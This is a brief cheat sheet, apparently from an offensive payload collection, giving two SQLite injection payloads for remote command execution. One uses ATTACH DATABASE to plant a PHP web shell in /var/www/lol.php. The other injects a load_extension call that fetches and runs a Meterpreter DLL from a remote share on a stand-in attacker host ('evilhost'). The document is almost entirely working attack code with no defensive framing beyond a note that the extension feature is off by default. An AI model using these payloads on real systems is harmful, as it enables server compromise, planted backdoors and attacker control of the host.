# SQLite

##Remote Command Execution using SQLite command - Attach Database
```
ATTACH DATABASE ‘/var/www/lol.php’ AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES (‘<?system($_GET[‘cmd’]); ?>’);--
```

##Remote Command Execution using SQLite command - Load_extension
```
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```
Note: By default this component is disabled